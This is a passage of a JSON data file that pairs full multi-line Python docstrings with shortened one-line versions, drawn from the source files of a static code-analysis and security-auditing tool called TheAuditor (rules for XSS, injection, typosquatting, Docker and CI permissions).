    "original_lines": 8,
    "original": "\"\"\"\n    Load and aggregate stats from all historical journal files.\n\n    Args:\n        history_dir: Base history directory\n        window: Number of recent entries to analyze per file\n        run_type: Type of runs to load (\"full\", \"diff\", or \"all\")\n    \"\"\"",
    "truncated": "\"\"\"Load and aggregate stats from all historical journal files.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/models.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"\n    Validate ML queries against schema contract.\n\n    This function ensures all database queries use valid column names\n    from the schema contract, preventing runtime errors if schema changes.\n\n    Called once at module initialization.\n    \"\"\"",
    "truncated": "\"\"\"Validate ML queries against schema contract.\"\"\""
  },
  {
    "file": "theauditor/insights/semantic_context.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Generate actionable migration suggestions.\n\n        Args:\n            result: ClassificationResult from classify_findings()\n\n        Returns:\n            List of migration suggestions with priorities\n        \"\"\"",
    "truncated": "\"\"\"Generate actionable migration suggestions.\"\"\""
  },
  {
    "file": "theauditor/insights/semantic_context.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Helper function to load semantic context.\n\n    Args:\n        yaml_path: Path to YAML context file\n\n    Returns:\n        Loaded SemanticContext instance\n    \"\"\"",
    "truncated": "\"\"\"Helper function to load semantic context.\"\"\""
  },
  {
    "file": "theauditor/journal.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Record a file being touched/analyzed.\n\n        Args:\n            file_path: Path to the file\n            operation: Type of operation (analyze, modify, create, etc.)\n            success: Whether operation succeeded\n            findings: Number of findings/issues found\n        \"\"\"",
    "truncated": "\"\"\"Record a file being touched/analyzed.\"\"\""
  },
  {
    "file": "theauditor/journal.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Record a patch/fix being applied to a file.\n\n        Args:\n            file_path: File being patched\n            success: Whether patch succeeded\n            patch_type: Type of patch (fix, refactor, update, etc.)\n            error_msg: Optional error message\n        \"\"\"",
    "truncated": "\"\"\"Record a patch/fix being applied to a file.\"\"\""
  },
  {
    "file": "theauditor/journal.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Get recent failure events.\n\n        Args:\n            limit: Maximum number of failures to return\n\n        Returns:\n            List of recent failure events\n        \"\"\"",
    "truncated": "\"\"\"Get recent failure events.\"\"\""
  },
  {
    "file": "theauditor/journal.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Get a journal writer for the current run.\n\n    Args:\n        run_type: Type of run (full, diff, etc.)\n\n    Returns:\n        JournalWriter instance\n    \"\"\"",
    "truncated": "\"\"\"Get a journal writer for the current run.\"\"\""
  },
  {
    "file": "theauditor/js_init.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"\n    Create or merge minimal package.json for lint/typecheck.\n\n    Returns:\n        {\"status\": \"created\"} if new file created\n        {\"status\": \"merged\"} if existing file updated\n        {\"status\": \"unchanged\"} if no changes needed\n    \"\"\"",
    "truncated": "\"\"\"Create or merge minimal package.json for lint/typecheck.\"\"\""
  },
  {
    "file": "theauditor/js_semantic_parser.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Create a Node.js helper script for batch TypeScript AST extraction.\n\n        This script processes multiple files in a single TypeScript program,\n        dramatically improving performance by reusing the dependency cache.\n\n        Returns:\n            Path to the created batch helper script\n        \"\"\"",
    "truncated": "\"\"\"Create a Node.js helper script for batch TypeScript AST extraction.\"\"\""
  },
  {
    "file": "theauditor/js_semantic_parser.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Extract type-related issues from the semantic AST.\n\n        Args:\n            ast_data: The AST data returned by get_semantic_ast\n\n        Returns:\n            List of type issues found (any types, type suppressions, unsafe casts)\n        \"\"\"",
    "truncated": "\"\"\"Extract type-related issues from the semantic AST.\"\"\""
  },
  {
    "file": "theauditor/linters/linters.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Run all available linters on appropriate files.\n\n        Args:\n            workset_files: Optional list of file paths to lint (None = all files)\n\n        Returns:\n            List of finding dictionaries\n        \"\"\"",
    "truncated": "\"\"\"Run all available linters on appropriate files.\"\"\""
  },
  {
    "file": "theauditor/linters/linters.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Query database for source files with given extensions.\n\n        Args:\n            extensions: List of file extensions (e.g., ['.js', '.py'])\n\n        Returns:\n            List of file paths from database (empty list on error)\n        \"\"\"",
    "truncated": "\"\"\"Query database for source files with given extensions.\"\"\""
  },
  {
    "file": "theauditor/linters/linters.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Write findings to JSON file for AI consumption.\n\n        Args:\n            findings: List of finding dictionaries\n\n        Raises:\n            IOError: If file write fails (disk full, permissions, etc.)\n        \"\"\"",
    "truncated": "\"\"\"Write findings to JSON file for AI consumption.\"\"\""
  },
  {
    "file": "theauditor/linters/linters.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Run Cargo Clippy on Rust project and parse output.\n\n        Clippy runs at the workspace level, not per-file. It analyzes the entire\n        Rust project and reports issues across all .rs files.\n\n        Returns:\n            List of finding dictionaries\n        \"\"\"",
    "truncated": "\"\"\"Run Cargo Clippy on Rust project and parse output.\"\"\""
  },
  {
    "file": "theauditor/manifest_parser.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Find all manifest files in a polyglot monorepo.\n\n        Args:\n            root: Project root directory\n\n        Returns:\n            List of manifest file paths, excluding node_modules/vendor/etc.\n        \"\"\"",
    "truncated": "\"\"\"Find all manifest files in a polyglot monorepo.\"\"\""
  },
  {
    "file": "theauditor/module_resolver.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Resolves module imports for TypeScript/JavaScript projects.\n\n    Handles:\n    - TypeScript path aliases from tsconfig.json\n    - Webpack aliases from webpack.config.js\n    - Node.js module resolution algorithm\n    - Relative and absolute imports\n    \"\"\"",
    "truncated": "\"\"\"Resolves module imports for TypeScript/JavaScript projects.\"\"\""
  },
  {
    "file": "theauditor/pattern_loader.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Load patterns from a single YAML file.\n\n        Args:\n            file_path: Path to YAML file.\n\n        Returns:\n            List of Pattern objects.\n        \"\"\"",
    "truncated": "\"\"\"Load patterns from a single YAML file.\"\"\""
  },
  {
    "file": "theauditor/pattern_loader.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Get all patterns applicable to a specific language.\n\n        Args:\n            language: Programming language (e.g., 'python', 'javascript').\n\n        Returns:\n            List of applicable patterns.\n        \"\"\"",
    "truncated": "\"\"\"Get all patterns applicable to a specific language.\"\"\""
  },
  {
    "file": "theauditor/pipeline/ui.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Print a status panel with colored border.\n\n    Args:\n        status: Status label (e.g., \"CRITICAL\", \"CLEAN\")\n        message: Main message line\n        detail: Additional detail line\n        level: One of \"critical\", \"high\", \"medium\", \"low\", \"success\", \"info\"\n    \"\"\"",
    "truncated": "\"\"\"Print a status panel with colored border.\"\"\""
  },
  {
    "file": "theauditor/pipelines.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Pipeline execution module for TheAuditor.\n\n2025 Modern Architecture: AsyncIO + Memory Pipes + RichRenderer\n- No temp files for subprocess IPC\n- No threading/ThreadPoolExecutor\n- Parallel execution via asyncio.gather()\n- Single RichRenderer for all console output\n\"\"\"",
    "truncated": "\"\"\"Pipeline execution module for TheAuditor.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Initialize planning database connection.\n\n        Args:\n            db_path: Path to planning.db (typically .pf/planning.db)\n\n        Raises:\n            FileNotFoundError: If planning.db doesn't exist (must init first)\n        \"\"\"",
    "truncated": "\"\"\"Initialize planning database connection.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Self-healing: Ensures the existing physical DB matches code expectations.\n\n        Run automatically in __init__. Handles schema migrations for existing\n        planning.db files when new columns are added.\n\n        This is NOT a fallback pattern - it's a forward migration that ensures\n        old databases work with new code. If migration fails, it fails hard.\n        \"\"\"",
    "truncated": "\"\"\"Self-healing: Ensures the existing physical DB matches code expectations.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Get plan by ID.\n\n        Args:\n            plan_id: ID of plan\n\n        Returns:\n            dict with plan details or None if not found\n        \"\"\"",
    "truncated": "\"\"\"Get plan by ID.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"DEPRECATED: Legacy snapshot creation without shadow git.\n\n        Use create_snapshot() instead for new code.\n        Kept for backward compatibility with existing callers.\n\n        Returns:\n            snapshot_id: ID of created snapshot\n        \"\"\"",
    "truncated": "\"\"\"DEPRECATED: Legacy snapshot creation without shadow git.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Get task_number from task_id.\n\n        Args:\n            task_id: ID of task\n\n        Returns:\n            task_number or None if task not found\n        \"\"\"",
    "truncated": "\"\"\"Get task_number from task_id.\"\"\""
  },
  {
    "file": "theauditor/planning/shadow_git.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Initialize or load the shadow repository.\n\n        Args:\n            pf_root: The .pf/ directory path\n\n        Raises:\n            pygit2.GitError: If repository initialization fails\n        \"\"\"",
    "truncated": "\"\"\"Initialize or load the shadow repository.\"\"\""
  },
  {
    "file": "theauditor/planning/shadow_git.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Manages shadow git repository for planning snapshots.\n\n    The shadow repo is a bare git repository that stores file states\n    without affecting the user's actual git history.\n\n    Attributes:\n        repo_path: Path to .pf/snapshots.git\n    \"\"\"",
    "truncated": "\"\"\"Manages shadow git repository for planning snapshots.\"\"\""
  },
  {
    "file": "theauditor/rules/base.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Convert to dictionary for JSON serialization.\n\n        Field mappings aligned with findings_consolidated schema:\n        - rule_name → rule\n        - file_path → file\n        - snippet → code_snippet\n        - cwe_id → cwe\n        \"\"\"",
    "truncated": "\"\"\"Convert to dictionary for JSON serialization.\"\"\""
  },
  {
    "file": "theauditor/rules/base.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Check if a function follows the standard rule signature.\n\n    Args:\n        func: Function to validate\n\n    Returns:\n        True if signature matches standard, False otherwise\n    \"\"\"",
    "truncated": "\"\"\"Check if a function follows the standard rule signature.\"\"\""
  },
  {
    "file": "theauditor/rules/common/util.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Check if string is highly repetitive.\n\n        Args:\n            text: String to analyze\n\n        Returns:\n            True if any character makes up >90% of the string\n        \"\"\"",
    "truncated": "\"\"\"Check if string is highly repetitive.\"\"\""
  },
  {
    "file": "theauditor/rules/common/util.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Check if string is a common test/placeholder value.\n\n        Args:\n            text: String to analyze\n\n        Returns:\n            True if text contains common test values\n        \"\"\"",
    "truncated": "\"\"\"Check if string is a common test/placeholder value.\"\"\""
  },
  {
    "file": "theauditor/rules/common/util.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Check if decoded text appears to be a secret.\n\n        Args:\n            text: Decoded text to analyze\n\n        Returns:\n            True if text appears to be a legitimate secret\n        \"\"\"",
    "truncated": "\"\"\"Check if decoded text appears to be a secret.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/dependency_bloat.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Detect excessive dependency counts in package files.\n\n    Args:\n        context: Rule execution context with db_path\n\n    Returns:\n        List of findings for dependency bloat\n    \"\"\"",
    "truncated": "\"\"\"Detect excessive dependency counts in package files.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/ghost_dependencies.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Extract all imported package names from import_styles table.\n\n    Args:\n        cursor: Database cursor\n\n    Returns:\n        Dict mapping package names to list of (file, line) tuples\n    \"\"\"",
    "truncated": "\"\"\"Extract all imported package names from import_styles table.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/suspicious_versions.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Detect dependencies with suspicious version specifications.\n\n    Args:\n        context: Rule execution context with db_path\n\n    Returns:\n        List of findings for suspicious versions\n    \"\"\"",
    "truncated": "\"\"\"Detect dependencies with suspicious version specifications.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/typosquatting.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Detect potential typosquatting in package names.\n\n    Args:\n        context: Rule execution context with db_path\n\n    Returns:\n        List of findings for potential typosquatting\n    \"\"\"",
    "truncated": "\"\"\"Detect potential typosquatting in package names.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/typosquatting.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Check declared dependencies for typosquatting.\n\n    Args:\n        cursor: Database cursor\n\n    Returns:\n        List of findings for declared dependencies\n    \"\"\"",
    "truncated": "\"\"\"Check declared dependencies for typosquatting.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/typosquatting.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Check imported packages for typosquatting.\n\n    Args:\n        cursor: Database cursor\n\n    Returns:\n        List of findings for imported packages\n    \"\"\"",
    "truncated": "\"\"\"Check imported packages for typosquatting.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/unused_dependencies.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Detect packages declared in dependencies but never imported.\n\n    Args:\n        context: Rule execution context with db_path\n\n    Returns:\n        List of findings for unused dependencies\n    \"\"\"",
    "truncated": "\"\"\"Detect packages declared in dependencies but never imported.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/version_pinning.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Detect unpinned version ranges in production dependencies.\n\n    Args:\n        context: Rule execution context with db_path\n\n    Returns:\n        List of findings for unpinned versions\n    \"\"\"",
    "truncated": "\"\"\"Detect unpinned version ranges in production dependencies.\"\"\""
  },
  {
    "file": "theauditor/rules/deployment/aws_cdk_s3_public_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"AWS CDK S3 Public Access Detection - database-first rule.\n\nDetects S3 buckets with public read access enabled in CDK Python code.\n\nChecks:\n- public_read_access=True (CRITICAL)\n- Missing block_public_access configuration (HIGH)\n\"\"\"",
    "truncated": "\"\"\"AWS CDK S3 Public Access Detection - database-first rule.\"\"\""
  },
  {
    "file": "theauditor/rules/deployment/compose_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Analyze a single Docker Compose service for security issues.\n\n    Args:\n        row: Database row with ALL 17 service fields (Phase 3C)\n\n    Returns:\n        List of findings for this service\n    \"\"\"",
    "truncated": "\"\"\"Analyze a single Docker Compose service for security issues.\"\"\""
  },
  {
    "file": "theauditor/rules/deployment/docker_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Detect containers without HEALTHCHECK instruction.\n\n    HEALTHCHECK allows Docker/Kubernetes to monitor container health.\n    Without it, orchestrators can't detect application failures and\n    will keep routing traffic to dead containers.\n\n    Checks docker_images.has_healthcheck field.\n    \"\"\"",
    "truncated": "\"\"\"Detect containers without HEALTHCHECK instruction.\"\"\""
  },
  {
    "file": "theauditor/rules/frameworks/express_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Register Express.js-specific taint patterns.\n\n    This function is called by the orchestrator to register\n    framework-specific sources and sinks for taint analysis.\n\n    Args:\n        taint_registry: TaintRegistry instance\n    \"\"\"",
    "truncated": "\"\"\"Register Express.js-specific taint patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/frameworks/fastapi_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Register FastAPI-specific taint patterns.\n\n    This function is called by the orchestrator to register\n    framework-specific sources and sinks for taint analysis.\n\n    Args:\n        taint_registry: TaintRegistry instance\n    \"\"\"",
    "truncated": "\"\"\"Register FastAPI-specific taint patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/frameworks/flask_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Register Flask-specific taint patterns.\n\n    This function is called by the orchestrator to register\n    framework-specific sources and sinks for taint analysis.\n\n    Args:\n        taint_registry: TaintRegistry instance\n    \"\"\"",
    "truncated": "\"\"\"Register Flask-specific taint patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/frameworks/nextjs_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Register Next.js-specific taint patterns.\n\n    This function is called by the orchestrator to register\n    framework-specific sources and sinks for taint analysis.\n\n    Args:\n        taint_registry: TaintRegistry instance\n    \"\"\"",
    "truncated": "\"\"\"Register Next.js-specific taint patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/frameworks/react_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Register React-specific taint patterns.\n\n    This function is called by the orchestrator to register\n    framework-specific sources and sinks for taint analysis.\n\n    Args:\n        taint_registry: TaintRegistry instance\n    \"\"\"",
    "truncated": "\"\"\"Register React-specific taint patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/frameworks/vue_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Register Vue.js-specific taint patterns.\n\n    This function is called by the orchestrator to register\n    framework-specific sources and sinks for taint analysis.\n\n    Args:\n        taint_registry: TaintRegistry instance\n    \"\"\"",
    "truncated": "\"\"\"Register Vue.js-specific taint patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/excessive_permissions.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Parse permissions JSON string.\n\n    Args:\n        permissions_json: JSON string of permissions\n\n    Returns:\n        Dict of permission -> level, or empty dict if parse fails\n    \"\"\"",
    "truncated": "\"\"\"Parse permissions JSON string.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/excessive_permissions.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Check for dangerous write permissions.\n\n    Args:\n        permissions: Dict of permission -> level\n\n    Returns:\n        List of dangerous permission names found\n    \"\"\"",
    "truncated": "\"\"\"Check for dangerous write permissions.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/script_injection.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Register GitHub Actions taint patterns for flow analysis.\n\n    This function is called by the orchestrator to register GitHub Actions\n    specific taint sources (untrusted PR/issue data) and sinks (shell execution).\n\n    Args:\n        taint_registry: TaintRegistry instance from orchestrator\n    \"\"\"",
    "truncated": "\"\"\"Register GitHub Actions taint patterns for flow analysis.\"\"\""
  },
  {
    "file": "theauditor/rules/orchestrator.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Execute ALL discovered rules with appropriate parameters.\n\n        Args:\n            context: Optional context with file, AST, database info\n\n        Returns:\n            List of findings from all rules\n        \"\"\"",
    "truncated": "\"\"\"Execute ALL discovered rules with appropriate parameters.\"\"\""
  },
  {
    "file": "theauditor/rules/orchestrator.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Run rules applicable to a specific file, WITH METADATA FILTERING.\n\n        Args:\n            context: Context with file information\n\n        Returns:\n            List of findings for this file\n        \"\"\"",
    "truncated": "\"\"\"Run rules applicable to a specific file, WITH METADATA FILTERING.\"\"\""
  },
  {
    "file": "theauditor/rules/orchestrator.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Get all rules of a specific type.\n\n        Args:\n            rule_type: Type of rules to retrieve (standalone, discovery, taint-dependent)\n\n        Returns:\n            List of RuleInfo objects matching the type\n        \"\"\"",
    "truncated": "\"\"\"Get all rules of a specific type.\"\"\""
  },
  {
    "file": "theauditor/rules/orchestrator.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Run all discovery rules that populate the taint registry.\n\n        Args:\n            registry: TaintRegistry to populate with discovered patterns\n\n        Returns:\n            List of findings from discovery rules\n        \"\"\"",
    "truncated": "\"\"\"Run all discovery rules that populate the taint registry.\"\"\""
  },
  {
    "file": "theauditor/rules/orchestrator.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Run all rules that depend on taint analysis results.\n\n        Args:\n            taint_checker: Function to check if a variable is tainted\n\n        Returns:\n            List of findings from taint-dependent rules\n        \"\"\"",
    "truncated": "\"\"\"Run all rules that depend on taint analysis results.\"\"\""
  },
  {
    "file": "theauditor/rules/orchestrator.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Get cached taint analysis results for rules to query.\n\n        This provides rules with access to the main taint analyzer's\n        results WITH JavaScript pattern support.\n\n        Returns:\n            A function that returns relevant taint paths\n        \"\"\"",
    "truncated": "\"\"\"Get cached taint analysis results for rules to query.\"\"\""
  },
  {
    "file": "theauditor/rules/orchestrator.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Unified orchestrator for dynamic rule discovery and execution.\n\nThis module provides a central orchestrator that:\n1. Dynamically discovers ALL rules in the /rules directory\n2. Analyzes their signatures to determine requirements\n3. Executes them with appropriate parameters\n4. Provides a unified interface for all detection systems\n\"\"\"",
    "truncated": "\"\"\"Unified orchestrator for dynamic rule discovery and execution.\"\"\""
  },
  {
    "file": "theauditor/rules/orm/prisma_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Register Prisma-specific taint patterns.\n\n    This function is called by the orchestrator to register\n    ORM-specific sources and sinks for taint analysis.\n\n    Args:\n        taint_registry: TaintRegistry instance\n    \"\"\"",
    "truncated": "\"\"\"Register Prisma-specific taint patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/orm/sequelize_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Detect Sequelize ORM anti-patterns and performance issues.\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of Sequelize ORM issues found\n    \"\"\"",
    "truncated": "\"\"\"Detect Sequelize ORM anti-patterns and performance issues.\"\"\""
  },
  {
    "file": "theauditor/rules/orm/typeorm_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Register TypeORM-specific taint patterns.\n\n    This function is called by the orchestrator to register\n    ORM-specific sources and sinks for taint analysis.\n\n    Args:\n        taint_registry: TaintRegistry instance\n    \"\"\"",
    "truncated": "\"\"\"Register TypeORM-specific taint patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/performance/perf_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Register performance-related taint patterns.\n\n    This function is called by the orchestrator to register\n    performance-specific sources and sinks for taint analysis.\n\n    Args:\n        taint_registry: TaintRegistry instance\n    \"\"\"",
    "truncated": "\"\"\"Register performance-related taint patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/python/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Detect Python async and concurrency issues.\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of concurrency issues found\n    \"\"\"",
    "truncated": "\"\"\"Detect Python async and concurrency issues.\"\"\""
  },
  {
    "file": "theauditor/rules/python/python_crypto_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Detect Python cryptography vulnerabilities.\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of cryptography vulnerabilities found\n    \"\"\"",
    "truncated": "\"\"\"Detect Python cryptography vulnerabilities.\"\"\""
  },
  {
    "file": "theauditor/rules/python/python_deserialization_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Detect Python deserialization vulnerabilities.\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of deserialization vulnerabilities found\n    \"\"\"",
    "truncated": "\"\"\"Detect Python deserialization vulnerabilities.\"\"\""
  },
  {
    "file": "theauditor/rules/python/python_injection_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Detect Python injection vulnerabilities.\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of injection vulnerabilities found\n    \"\"\"",
    "truncated": "\"\"\"Detect Python injection vulnerabilities.\"\"\""
  },
  {
    "file": "theauditor/rules/react/__init__.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"React-specific rule detectors for TheAuditor.\n\nThis package contains semantic AST-based rules for detecting\nReact component, hooks, rendering, and state management issues.\n\nAll rules follow the database-first architecture and use the\nstandardized rule interface (StandardRuleContext → List[StandardFinding]).\n\"\"\"",
    "truncated": "\"\"\"React-specific rule detectors for TheAuditor.\"\"\""
  },
  {
    "file": "theauditor/rules/react/component_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"React Component Analyzer - Database-Driven Implementation.\n\nDetects React component anti-patterns and performance issues using data from\nreact_components, react_hooks, and function_call_args tables.\n\nFocuses on component structure, organization, and best practices.\nSchema Contract Compliance: v1.1+ (Fail-Fast, direct schema-bound queries)\n\"\"\"",
    "truncated": "\"\"\"React Component Analyzer - Database-Driven Implementation.\"\"\""
  },
  {
    "file": "theauditor/rules/react/hooks_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"React Hooks Analyzer - Database-Driven Implementation.\n\nDetects React hooks violations and anti-patterns using REAL DATA from\nreact_hooks, react_components, and variable_usage tables.\n\nNo more broken heuristics - this uses actual parsed dependency arrays,\ncleanup detection, and component boundaries from the database.\n\"\"\"",
    "truncated": "\"\"\"React Hooks Analyzer - Database-Driven Implementation.\"\"\""
  },
  {
    "file": "theauditor/rules/security/api_auth_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Detect API authentication security issues.\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of API authentication issues found\n    \"\"\"",
    "truncated": "\"\"\"Detect API authentication security issues.\"\"\""
  },
  {
    "file": "theauditor/rules/security/cors_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Main entry point for CORS vulnerability detection.\n\n    Args:\n        context: Standard rule context with database path\n\n    Returns:\n        List of CORS vulnerability findings\n    \"\"\"",
    "truncated": "\"\"\"Main entry point for CORS vulnerability detection.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/component_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Get all Vue-related files from the database.\n\n    Schema contract (v1.1+) guarantees all tables exist.\n    If table is missing, we WANT the rule to crash to expose indexer bugs.\n\n    Queries ALL relevant tables and combines results - no conditional logic.\n    No early returns - trust the database schema.\n    \"\"\"",
    "truncated": "\"\"\"Get all Vue-related files from the database.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/__init__.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Run all XSS analyzers based on detected frameworks.\n\n    This is the main entry point for XSS detection.\n    Runs appropriate analyzers based on framework context.\n\n    Returns:\n        Consolidated list of XSS findings with minimal false positives\n    \"\"\"",
    "truncated": "\"\"\"Run all XSS analyzers based on detected frameworks.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/dom_xss_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Check for direct data flows from sources to sinks.\n\n    Modernization (2025-11-22):\n    - Performance: Filter for most common sinks in SQL (Pareto optimization: 80/20 rule)\n    - Memory safe: Stream results with cursor iteration instead of fetchall()\n    - Hybrid approach: SQL reduces millions→thousands, Python set ops reduce thousands→findings\n    - NOTE: NOT using _build_sql_filter (SQL injection risk, can't use indexes, false positives)\n    \"\"\"",
    "truncated": "\"\"\"Check for direct data flows from sources to sinks.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/dom_xss_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Check for postMessage XSS vulnerabilities.\n\n    Modernization (2025-11-22):\n    - Performance: Push addEventListener + message filtering to SQL\n    - Reduced N+1: From 3 queries per addEventListener to 2 queries per addEventListener('message')\n    - Memory safe: Stream results with cursor iteration\n    - Note: Remaining N+1 is acceptable (checking origin validation per event listener)\n    \"\"\"",
    "truncated": "\"\"\"Check for postMessage XSS vulnerabilities.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/xss_analyze.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Main XSS detection with framework awareness.\n\n    REFACTORED: Uses context manager + sqlite3.Row for cleaner code.\n    PHASE 2: Integrates SanitizerRegistry for unified sanitizer intelligence.\n\n    Returns:\n        List of XSS findings with drastically reduced false positives\n    \"\"\"",
    "truncated": "\"\"\"Main XSS detection with framework awareness.\"\"\""
  },
  {
    "file": "theauditor/session/analysis.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Analyze complete session: score diffs + check workflow + store.\n\n        Args:\n            session: Session object to analyze\n\n        Returns:\n            SessionExecution object with complete analysis\n        \"\"\"",
    "truncated": "\"\"\"Analyze complete session: score diffs + check workflow + store.\"\"\""
  },
  {
    "file": "theauditor/session/analysis.py",
    "line": -1,
    "original_lines": 8,
    "original": "\"\"\"Analyze multiple sessions in batch.\n\n        Args:\n            sessions: List of Session objects\n\n        Returns:\n            List of SessionExecution objects\n        \"\"\"",
    "truncated": "\"\"\"Analyze multiple sessions in batch.\"\"\""
  },
  {
    "file": "theauditor/session/detector.py",
    "line": -1,
    "original_lines": 8,
